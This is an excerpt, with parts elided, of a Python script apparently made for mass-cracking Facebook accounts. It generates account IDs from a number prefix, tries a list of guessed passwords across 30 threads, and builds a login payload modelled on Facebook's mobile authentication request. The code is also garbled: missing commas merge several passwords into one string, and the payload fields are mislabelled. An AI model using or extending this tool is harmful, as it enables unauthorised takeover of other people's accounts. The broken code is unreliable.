...
def BD_CLONING():
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat''free fire''password''i love you']
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, '100095223731966': ids, 'SAMAN TA ++11': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
